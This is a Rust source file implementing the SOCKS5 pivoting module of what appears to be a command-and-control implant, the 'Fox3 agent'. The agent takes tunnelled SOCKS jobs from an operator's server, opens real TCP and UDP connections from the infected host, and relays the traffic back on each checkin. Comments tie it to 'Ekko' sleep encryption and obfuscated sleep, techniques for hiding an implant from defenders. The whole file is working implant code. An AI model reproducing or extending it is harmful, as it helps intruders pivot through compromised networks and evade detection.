/// SOCKS5 connection manager for the Fox3 agent.
///
/// # How it fits into the async tunnel model
///
/// The server-side SOCKS module (pkg/modules/socks) synthesises a SOCKS5
/// handshake and delivers it to the agent as a series of indexed jobs.SOCKS
/// packets.  The agent is the SOCKS5
/// "server": it parses the handshake, establishes a real TCP connection to the
/// target, and forwards data in both directions.
///
/// # Threading model
///
/// ```
/// Main thread
///   │  owns SocksManager (single-threaded handle_incoming / drain_outbound)
///   │  writes data to TCP stream
///   │  drains outbound queue on every checkin
///   │
///   └─ spawns one BackgroundReader per established connection
///         reads from TCP stream (try_clone of same socket)
///         pushes SocksOut items to shared Arc<Mutex<Vec<SocksOut>>>
///         calls WakeSignal::notify() so main loop wakes early
/// ```
///
/// # SOCKS5 packet sequencing
///
/// Both sides (server and agent) maintain independent monotonic counters:
///   - `recv_idx`: next expected index arriving FROM the server
///   - `send_idx`: next index to attach to packets going TO the server
///
/// Out-of-order inbound packets are buffered and replayed in order.
///
/// # Wire format
///
/// Index 0  server→agent: SOCKS5 greeting   [0x05, 0x01, 0x00]
/// Index 0  agent→server: method selection  [0x05, 0x00]        (no-auth)
/// Index 1  server→agent: CONNECT request   [0x05,0x01,0x00,ATYP,HOST,PORT]
/// Index 1  agent→server: CONNECT reply     [0x05,0x00,0x00,0x01,0,0,0,0,0,0]
/// Index 2+ data flows freely in both directions

use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpStream, UdpSocket};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use uuid::Uuid;

use crate::protocol::{Job, JOB_SOCKS, SocksPayload};

/// Maximum number of outbound SOCKS packets queued before dropping oldest 25%.
const MAX_OUTBOUND: usize = 500;

// ── Wake signal ───────────────────────────────────────────────────────────────

/// Shared wake signal between the main agent loop and background reader threads.
///
/// The main loop sleeps via `WakeSignal::wait(timeout)`.  Background threads
/// call `WakeSignal::notify()` when new TCP data arrives so the loop wakes
/// immediately rather than waiting out the full sleep interval.
///
/// # Platform implementations
///
/// **Windows**: Uses a kernel Event object (`CreateEventW`, auto-reset).
///   - `wait()` → `WaitForSingleObjectEx(event, ms, TRUE)` (alertable)
///   - `notify()` → `SetEvent(event)`
///   - `handle()` → raw HANDLE for use in `WaitForMultipleObjectsEx` (Ekko sleep encryption)
///
/// **Non-Windows**: Uses `std::sync::Condvar` (cross-platform fallback).

// ── Windows: Event-handle implementation ─────────────────────────────────────
#[cfg(windows)]
mod wake_impl {
    use std::sync::Arc;
    use std::time::Duration;
    use std::ffi::c_void;

    #[allow(dead_code)]
    const WAIT_OBJECT_0: u32 = 0;

    extern "system" {
        fn CreateEventW(attrs: *const c_void, manual_reset: i32, initial: i32, name: *const u16) -> *mut c_void;
        fn SetEvent(handle: *mut c_void) -> i32;
        fn WaitForSingleObjectEx(handle: *mut c_void, ms: u32, alertable: i32) -> u32;
        fn CloseHandle(handle: *mut c_void) -> i32;
    }

    struct WakeInner {
        event: *mut c_void,
    }

    // SAFETY: Windows Event handles are thread-safe (kernel object).
    unsafe impl Send for WakeInner {}
    unsafe impl Sync for WakeInner {}

    impl Drop for WakeInner {
        fn drop(&mut self) {
            if !self.event.is_null() {
                unsafe { CloseHandle(self.event); }
            }
        }
    }

    pub struct WakeSignal(Arc<WakeInner>);

    impl WakeSignal {
        pub fn new() -> Option<Self> {
            let event = unsafe {
                CreateEventW(
                    std::ptr::null(),
                    0,  // auto-reset
                    0,  // initial state: non-signaled
                    std::ptr::null(),
                )
            };
            if event.is_null() {
                crate::dbg_print!("[ekko] CreateEventW failed, falling back to unencrypted sleep");
                return None;
            }
            Some(Self(Arc::new(WakeInner { event })))
        }

        pub fn clone_ref(&self) -> Self {
            Self(Arc::clone(&self.0))
        }

        /// Block until `timeout` elapses OR `notify()` is called (auto-resets).
        pub fn wait(&self, timeout: Duration) {
            let ms = timeout.as_millis().min(u32::MAX as u128) as u32;
            unsafe {
                WaitForSingleObjectEx(self.0.event, ms, 1 /* alertable */);
            }
        }

        /// Wake a sleeping `wait()` call immediately.
        pub fn notify(&self) {
            unsafe { SetEvent(self.0.event); }
        }

        /// Non-blocking check: returns true if the event was signaled (auto-resets).
        #[allow(dead_code)]
        pub fn try_check(&self) -> bool {
            unsafe {
                WaitForSingleObjectEx(self.0.event, 0, 0) == WAIT_OBJECT_0
            }
        }

        /// Return the raw event HANDLE for use in WaitForMultipleObjectsEx (Ekko).
        pub fn handle(&self) -> *mut c_void {
            self.0.event
        }
    }
}

// ── Non-Windows: Condvar implementation ──────────────────────────────────────
#[cfg(not(windows))]
mod wake_impl {
    use std::sync::{Arc, Mutex};
    use std::time::Duration;

    pub struct WakeSignal(Arc<(Mutex<bool>, std::sync::Condvar)>);

    impl WakeSignal {
        pub fn new() -> Option<Self> {
            Some(Self(Arc::new((Mutex::new(false), std::sync::Condvar::new()))))
        }

        pub fn clone_ref(&self) -> Self {
            Self(Arc::clone(&self.0))
        }

        pub fn wait(&self, timeout: Duration) {
            let (lock, cvar) = &*self.0;
            let mut notified = lock.lock().unwrap_or_else(|e| e.into_inner());
            if !*notified {
                let (guard, _) = cvar.wait_timeout(notified, timeout).unwrap();
                notified = guard;
            }
            *notified = false;
        }

        pub fn notify(&self) {
            let (lock, cvar) = &*self.0;
            *lock.lock().unwrap_or_else(|e| e.into_inner()) = true;
            cvar.notify_one();
        }

        pub fn try_check(&self) -> bool {
            let (lock, _) = &*self.0;
            let mut notified = lock.lock().unwrap_or_else(|e| e.into_inner());
            let was = *notified;
            *notified = false;
            was
        }

        /// Stub — no event handle on non-Windows.
        pub fn handle(&self) -> *mut std::ffi::c_void {
            std::ptr::null_mut()
        }
    }
}

pub use wake_impl::WakeSignal;

// ── Per-connection state ───────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq)]
enum ConnState {
    /// Awaiting SOCKS5 greeting at index 0.
    Greeting,
    /// Awaiting SOCKS5 CONNECT request at index 1.
    Connect,
    /// Tunnel established; forwarding TCP data.
    Established,
    /// UDP ASSOCIATE established; forwarding UDP datagrams.
    UdpEstablished,
}

struct SocksConn {
    state:      ConnState,
    stream:     Option<TcpStream>,     // TCP write end (main thread only)
    udp_socket: Option<UdpSocket>,     // UDP socket (for UDP ASSOCIATE)
    job_id:     String,
    token:      Uuid,
    agent_id:   Uuid,
    recv_idx:   i32,                   // next expected inbound (server→agent) index
    send_idx:   i32,                   // next outbound (agent→server) index
    pending:    HashMap<i32, Vec<u8>>, // out-of-order buffer
}

// ── Outbound packet queued by background reader ────────────────────────────────

/// A SOCKS job ready to be delivered to the server in the next checkin.
pub struct SocksOut {
    pub conn_id:  Uuid,
    pub job_id:   String,
    pub token:    Uuid,
    pub agent_id: Uuid,
    pub index:    i32,
    pub data:     Vec<u8>,
    pub close:    bool,
}

impl SocksOut {
    /// Convert to the `jobs.Job` wire format expected by the server.
    pub fn into_job(self) -> Job {
        Job {
            agent_id: self.agent_id,
            id:       self.job_id,
            token:    self.token,
            job_type: JOB_SOCKS,
            payload:  serde_json::to_value(
                SocksPayload::from_bytes(self.conn_id, self.index, &self.data, self.close)
            ).ok(),
        }
    }
}

// ── Connection manager ────────────────────────────────────────────────────────

pub struct SocksManager {
    /// Active connections, keyed by connection UUID.
    conns:    HashMap<Uuid, SocksConn>,
    /// Queue of data received from TCP targets, waiting to go to the server.
    /// Filled by background reader threads; drained by the main agent loop.
    outbound: Arc<Mutex<Vec<SocksOut>>>,
}

impl SocksManager {
    pub fn new() -> Self {
        Self {
            conns:    HashMap::new(),
            outbound: Arc::new(Mutex::new(Vec::new())),
        }
    }

    /// True when at least one connection is active (drives fast-poll in main loop).
    pub fn has_active(&self) -> bool {
        !self.conns.is_empty()
    }

    /// Return a clone of the shared outbound queue Arc.
    /// Used by RPortFwdManager to share the same queue.
    pub fn outbound_queue(&self) -> Arc<Mutex<Vec<SocksOut>>> {
        Arc::clone(&self.outbound)
    }

    /// Drain all outbound packets accumulated by background reader threads.
    /// Called by the main loop before every checkin so queued TCP data is sent.
    pub fn drain_outbound(&self) -> Vec<SocksOut> {
        let mut q = self.outbound.lock().unwrap_or_else(|e| e.into_inner());
        std::mem::take(&mut *q)
    }

    /// Process an inbound `jobs.SOCKS` job from the server.
    ///
    /// Returns a (possibly empty) list of immediate response jobs to be included
    /// in the next outbound checkin.  For the SOCKS5 handshake phase these are
    /// the greeting reply and CONNECT reply; in data phase responses arrive via
    /// the background reader thread instead.
    pub fn handle_incoming(&mut self, job: &Job, wake: &WakeSignal) -> Vec<Job> {
        let payload = match job.payload.as_ref()
            .and_then(|v| serde_json::from_value::<SocksPayload>(v.clone()).ok())
        {
            Some(p) => p,
            None => return vec![],
        };

        let conn_id = payload.id;

        // ── New connection: create state entry ────────────────────────────────
        if !self.conns.contains_key(&conn_id) {
            if payload.close {
                return vec![]; // late close for already-gone connection
            }
            self.conns.insert(conn_id, SocksConn {
                state:      ConnState::Greeting,
                stream:     None,
                udp_socket: None,
                job_id:     job.id.clone(),
                token:      job.token,
                agent_id:   job.agent_id,
                recv_idx:   0,
                send_idx:   0,
                pending:    HashMap::new(),
            });
        }

        // Buffer out-of-order packet
        let conn = self.conns.get_mut(&conn_id).unwrap();
        if payload.index != conn.recv_idx {
            conn.pending.insert(payload.index, payload.decode_data());
            return vec![];
        }

        // Process in-order packets, draining the pending buffer afterwards
        let mut responses: Vec<Job> = Vec::new();
        let mut cur_data  = payload.decode_data();
        let mut cur_close = payload.close;

        loop {
            conn.recv_idx += 1;

            if cur_close {
                // Remote closed the connection
                if let Some(ref mut s) = conn.stream {
                    let _ = s.shutdown(std::net::Shutdown::Both);
                }
                self.conns.remove(&conn_id);
                break;
            }

            match conn.state {
                ConnState::Greeting => {
                    // Respond with SOCKS5 no-auth method selection
                    let reply = make_socks_job(conn_id, conn, &[0x05, 0x00]);
                    responses.push(reply);
                    conn.state = ConnState::Connect;
                }

                ConnState::Connect => {
                    // Check CMD byte: 0x01=CONNECT, 0x03=UDP ASSOCIATE
                    let cmd = if cur_data.len() >= 2 { cur_data[1] } else { 0 };

                    if cmd == 0x03 {
                        // ── UDP ASSOCIATE ─────────────────────────────────
                        match UdpSocket::bind("0.0.0.0:0") {
                            Ok(sock) => {
                                let local_port = sock.local_addr()
                                    .map(|a| a.port()).unwrap_or(0);
                                // Reply: VER=5 REP=0 RSV=0 ATYP=1 BND.ADDR BND.PORT
                                let mut reply = [0x05u8, 0x00, 0x00, 0x01,
                                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
                                reply[8] = (local_port >> 8) as u8;
                                reply[9] = (local_port & 0xFF) as u8;
                                let r = make_socks_job(conn_id, conn, &reply);
                                responses.push(r);

                                // Spawn background UDP reader
                                let read_sock = match sock.try_clone() {
                                    Ok(s) => s,
                                    Err(_) => {
                                        self.conns.remove(&conn_id);
                                        break;
                                    }
                                };
                                conn.udp_socket = Some(sock);
                                conn.state = ConnState::UdpEstablished;

                                let outbound_ref = Arc::clone(&self.outbound);
                                let wake_ref     = wake.clone_ref();
                                let job_id       = conn.job_id.clone();
                                let token        = conn.token;
                                let agent_id     = conn.agent_id;
                                let send_idx_cell = Arc::new(Mutex::new(conn.send_idx));
                                conn.send_idx += 1;

                                let send_idx_bg = Arc::clone(&send_idx_cell);
                                if let Err(e) = thread::Builder::new()
                                    .name(format!("socks-udp-{}", &conn_id.to_string()[..8]))
                                    .spawn(move || {
                                        udp_reader(conn_id, read_sock, outbound_ref,
                                                   wake_ref, job_id, token, agent_id,
                                                   send_idx_bg);
                                    })
                                {
                                    crate::dbg_print!("[socks] failed to spawn UDP reader thread: {}", e);
                                    self.conns.remove(&conn_id);
                                    break;
                                }
                                conn.send_idx = *send_idx_cell.lock().unwrap_or_else(|e| e.into_inner());
                            }
                            Err(_) => {
                                let reply = [0x05u8, 0x01, 0x00, 0x01,
                                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
                                let r = make_socks_job(conn_id, conn, &reply);
                                responses.push(r);
                                self.conns.remove(&conn_id);
                                break;
                            }
                        }
                    } else {
                        // ── TCP CONNECT (cmd=0x01) ───────────────────────
                        match parse_connect(&cur_data) {
                            Some(addr) => {
                                match TcpStream::connect_timeout(
                                    &addr.parse().unwrap_or_else(|_| {
                                        std::net::ToSocketAddrs::to_socket_addrs(&addr)
                                            .ok()
                                            .and_then(|mut i| i.next())
                                            .unwrap_or_else(|| "0.0.0.0:0".parse().unwrap())
                                    }),
                                    Duration::from_secs(10),
                                ).or_else(|_| {
                                    std::net::TcpStream::connect(&addr as &str)
                                }) {
                                    Ok(stream) => {
                                        let reply_bytes = [0x05u8, 0x00, 0x00, 0x01,
                                                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
                                        let reply = make_socks_job(conn_id, conn, &reply_bytes);
                                        responses.push(reply);

                                        let read_stream = match stream.try_clone() {
                                            Ok(s) => s,
                                            Err(_) => {
                                                self.conns.remove(&conn_id);
                                                break;
                                            }
                                        };
                                        conn.stream = Some(stream);
                                        conn.state  = ConnState::Established;

                                        let outbound_ref  = Arc::clone(&self.outbound);
                                        let wake_ref      = wake.clone_ref();
                                        let job_id        = conn.job_id.clone();
                                        let token         = conn.token;
                                        let agent_id      = conn.agent_id;
                                        let send_idx_cell = Arc::new(Mutex::new(conn.send_idx));
                                        conn.send_idx += 1;

                                        let send_idx_bg = Arc::clone(&send_idx_cell);
                                        if let Err(e) = thread::Builder::new()
                                            .name(format!("socks-{}", &conn_id.to_string()[..8]))
                                            .spawn(move || {
                                                tcp_reader(conn_id, read_stream, outbound_ref,
                                                           wake_ref, job_id, token, agent_id,
                                                           send_idx_bg);
                                            })
                                        {
                                            crate::dbg_print!("[socks] failed to spawn reader thread: {}", e);
                                            self.conns.remove(&conn_id);
                                            break;
                                        }
                                        conn.send_idx = *send_idx_cell.lock().unwrap_or_else(|e| e.into_inner());
                                    }
                                    Err(_) => {
                                        let reply_bytes = [0x05u8, 0x05, 0x00, 0x01,
                                                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
                                        let reply = make_socks_job(conn_id, conn, &reply_bytes);
                                        responses.push(reply);
                                        self.conns.remove(&conn_id);
                                        break;
                                    }
                                }
                            }
                            None => {
                                let reply_bytes = [0x05u8, 0x07, 0x00, 0x01,
                                                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
                                let reply = make_socks_job(conn_id, conn, &reply_bytes);
                                responses.push(reply);
                                self.conns.remove(&conn_id);
                                break;
                            }
                        }
                    }
                }

                ConnState::Established => {
                    // Forward data to the real TCP target
                    if !cur_data.is_empty() {
                        if let Some(ref mut s) = conn.stream {
                            if s.write_all(&cur_data).is_err() {
                                let _ = s.shutdown(std::net::Shutdown::Both);
                                self.conns.remove(&conn_id);
                                break;
                            }
                        }
                    }
                }

                ConnState::UdpEstablished => {
                    // Each packet carries a SOCKS5 UDP datagram:
                    //   RSV(2) + FRAG(1) + ATYP(1) + DST.ADDR + DST.PORT(2) + DATA
                    // Parse target address and payload, send via UDP.
                    if !cur_data.is_empty() {
                        if let Some((target, payload)) = parse_udp_datagram(&cur_data) {
                            if let Some(ref sock) = conn.udp_socket {
                                let _ = sock.send_to(payload, &target);
                            }
                        }
                    }
                }
            }

            // Drain buffered in-order packets
            let next_idx = conn.recv_idx;
            if let Some(data) = conn.pending.remove(&next_idx) {
                cur_data  = data;
                cur_close = false; // buffered packets don't carry close
            } else {
                break;
            }
        }

        responses
    }

}

// ── Helper — free function to avoid conflicting borrows ───────────────────────

/// Build a SOCKS reply `Job` and advance `conn.send_idx`.
///
/// Implemented as a free function (not a `SocksManager` method) so it can be
/// called while `conn` is already mutably borrowed from `self.conns` without
/// triggering a simultaneous `&self` borrow conflict (E0502).
fn make_socks_job(conn_id: Uuid, conn: &mut SocksConn, data: &[u8]) -> Job {
    let idx = conn.send_idx;
    conn.send_idx += 1;
    Job {
        agent_id: conn.agent_id,
        id:       conn.job_id.clone(),
        token:    conn.token,
        job_type: JOB_SOCKS,
        payload:  serde_json::to_value(
            SocksPayload::from_bytes(conn_id, idx, data, false)
        ).ok(),
    }
}

// ── Background TCP reader ─────────────────────────────────────────────────────

/// Reads data from the real TCP connection and queues it for the next checkin.
///
/// Runs in a dedicated thread (one per established SOCKS connection).
/// Terminates when the TCP stream is closed or errors.
fn tcp_reader(
    conn_id:  Uuid,
    mut stream: TcpStream,
    outbound: Arc<Mutex<Vec<SocksOut>>>,
    wake:     WakeSignal,
    job_id:   String,
    token:    Uuid,
    agent_id: Uuid,
    send_idx: Arc<Mutex<i32>>,
) {
    // 32 KiB read buffer — matches the SOCKS module's buffer size on the server
    let mut buf = [0u8; 32768];

    // 2-minute read timeout prevents truly stuck threads while being generous
    // for idle connections.
    stream.set_read_timeout(Some(Duration::from_secs(120))).ok();

    loop {
        match stream.read(&mut buf) {
            Ok(0) => {
                // EOF → signal close to the server
                let idx = {
                    let mut i = send_idx.lock().unwrap_or_else(|e| e.into_inner());
                    let v = *i;
                    *i += 1;
                    v
                };
                let mut q = outbound.lock().unwrap_or_else(|e| e.into_inner());
                if q.len() >= MAX_OUTBOUND {
                    let drop_count = q.len() / 4;
                    q.drain(..drop_count);
                }
                q.push(SocksOut {
                    conn_id, job_id: job_id.clone(), token, agent_id,
                    index: idx, data: vec![], close: true,
                });
                drop(q);
                wake.notify();
                return;
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock
                       || e.kind() == std::io::ErrorKind::TimedOut => {
                // Read timeout — connection is idle but alive, retry
                continue;
            }
            Err(_) => {
                // Real error → signal close
                let idx = {
                    let mut i = send_idx.lock().unwrap_or_else(|e| e.into_inner());
                    let v = *i;
                    *i += 1;
                    v
                };
                let mut q = outbound.lock().unwrap_or_else(|e| e.into_inner());
                if q.len() >= MAX_OUTBOUND {
                    let drop_count = q.len() / 4;
                    q.drain(..drop_count);
                }
                q.push(SocksOut {
                    conn_id, job_id: job_id.clone(), token, agent_id,
                    index: idx, data: vec![], close: true,
                });
                drop(q);
                wake.notify();
                return;
            }
            Ok(n) => {
                let idx = {
                    let mut i = send_idx.lock().unwrap_or_else(|e| e.into_inner());
                    let v = *i;
                    *i += 1;
                    v
                };
                let mut q = outbound.lock().unwrap_or_else(|e| e.into_inner());
                if q.len() >= MAX_OUTBOUND {
                    let drop_count = q.len() / 4;
                    q.drain(..drop_count);
                }
                q.push(SocksOut {
                    conn_id, job_id: job_id.clone(), token, agent_id,
                    index: idx, data: buf[..n].to_vec(), close: false,
                });
                drop(q);
                // Wake the main loop so it checkins with the fresh data immediately
                // rather than waiting out the full obfuscated sleep interval.
                wake.notify();
            }
        }
    }
}

// ── Background UDP reader ────────────────────────────────────────────────────

/// Reads UDP datagrams from the bound socket and queues them as SocksOut
/// (wrapped in SOCKS5 UDP response format) for the next checkin.
fn udp_reader(
    conn_id:  Uuid,
    socket:   UdpSocket,
    outbound: Arc<Mutex<Vec<SocksOut>>>,
    wake:     WakeSignal,
    job_id:   String,
    token:    Uuid,
    agent_id: Uuid,
    send_idx: Arc<Mutex<i32>>,
) {
    let mut buf = [0u8; 65536];

    // 2-minute read timeout prevents truly stuck threads.
    socket.set_read_timeout(Some(Duration::from_secs(120))).ok();

    loop {
        match socket.recv_from(&mut buf) {
            Ok((n, src)) => {
                // Build SOCKS5 UDP response: RSV(2) + FRAG(1) + ATYP + ADDR + PORT + DATA
                let response = build_udp_response(src, &buf[..n]);
                let idx = {
                    let mut i = send_idx.lock().unwrap_or_else(|e| e.into_inner());
                    let v = *i;
                    *i += 1;
                    v
                };
                let mut q = outbound.lock().unwrap_or_else(|e| e.into_inner());
                if q.len() >= MAX_OUTBOUND {
                    let drop_count = q.len() / 4;
                    q.drain(..drop_count);
                }
                q.push(SocksOut {
                    conn_id, job_id: job_id.clone(), token, agent_id,
                    index: idx, data: response, close: false,
                });
                drop(q);
                wake.notify();
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock
                       || e.kind() == std::io::ErrorKind::TimedOut => {
                continue;
            }
            Err(_) => {
                let idx = {
                    let mut i = send_idx.lock().unwrap_or_else(|e| e.into_inner());
                    let v = *i;
                    *i += 1;
                    v
                };
                let mut q = outbound.lock().unwrap_or_else(|e| e.into_inner());
                if q.len() >= MAX_OUTBOUND {
                    let drop_count = q.len() / 4;
                    q.drain(..drop_count);
                }
                q.push(SocksOut {
                    conn_id, job_id, token, agent_id,
                    index: idx, data: vec![], close: true,
                });
                drop(q);
                wake.notify();
                return;
            }
        }
    }
}

/// Build a SOCKS5 UDP response datagram wrapping `data` from `src`.
fn build_udp_response(src: std::net::SocketAddr, data: &[u8]) -> Vec<u8> {
    let mut buf = Vec::with_capacity(10 + data.len());
    buf.extend_from_slice(&[0x00, 0x00]); // RSV
    buf.push(0x00); // FRAG = no fragmentation
    match src {
        std::net::SocketAddr::V4(v4) => {
            buf.push(0x01); // ATYP IPv4
            buf.extend_from_slice(&v4.ip().octets());
            buf.extend_from_slice(&v4.port().to_be_bytes());
        }
        std::net::SocketAddr::V6(v6) => {
            buf.push(0x04); // ATYP IPv6
            buf.extend_from_slice(&v6.ip().octets());
            buf.extend_from_slice(&v6.port().to_be_bytes());
        }
    }
    buf.extend_from_slice(data);
    buf
}

// ── SOCKS5 parsers ───────────────────────────────────────────────────────────

/// Parse a SOCKS5 CONNECT request and return a `"host:port"` address string.
fn parse_connect(data: &[u8]) -> Option<String> {
    if data.len() < 7 { return None; }
    parse_socks5_address(&data[3..])
}

/// Parse a SOCKS5 UDP datagram: RSV(2) FRAG(1) ATYP(1) DST.ADDR DST.PORT(2) DATA.
/// Returns `(target_addr, payload_data)`.
fn parse_udp_datagram(data: &[u8]) -> Option<(String, &[u8])> {
    if data.len() < 7 { return None; }
    // Skip RSV(2) + FRAG(1) — FRAG must be 0 (no fragmentation support)
    if data[2] != 0 { return None; }
    let (addr, consumed) = parse_socks5_address_len(&data[3..])?;
    let offset = 3 + consumed;
    Some((addr, &data[offset..]))
}

/// Parse ATYP + address + port from a SOCKS5 request/datagram.
fn parse_socks5_address(data: &[u8]) -> Option<String> {
    parse_socks5_address_len(data).map(|(addr, _)| addr)
}

/// Parse ATYP + address + port, returning `(addr_string, bytes_consumed)`.
fn parse_socks5_address_len(data: &[u8]) -> Option<(String, usize)> {
    if data.is_empty() { return None; }
    let atyp = data[0];
    match atyp {
        0x01 => {
            if data.len() < 7 { return None; }
            let addr = format!("{}.{}.{}.{}", data[1], data[2], data[3], data[4]);
            let port = u16::from_be_bytes([data[5], data[6]]);
            Some((format!("{}:{}", addr, port), 7))
        }
        0x03 => {
            if data.len() < 2 { return None; }
            let dlen = data[1] as usize;
            if data.len() < 2 + dlen + 2 { return None; }
            let domain = std::str::from_utf8(&data[2..2 + dlen]).ok()?;
            let port = u16::from_be_bytes([data[2 + dlen], data[3 + dlen]]);
            Some((format!("{}:{}", domain, port), 4 + dlen))
        }
        0x04 => {
            if data.len() < 19 { return None; }
            let mut bytes = [0u8; 16];
            bytes.copy_from_slice(&data[1..17]);
            let addr = std::net::Ipv6Addr::from(bytes);
            let port = u16::from_be_bytes([data[17], data[18]]);
            Some((format!("[{}]:{}", addr, port), 19))
        }
        _ => None,
    }
}
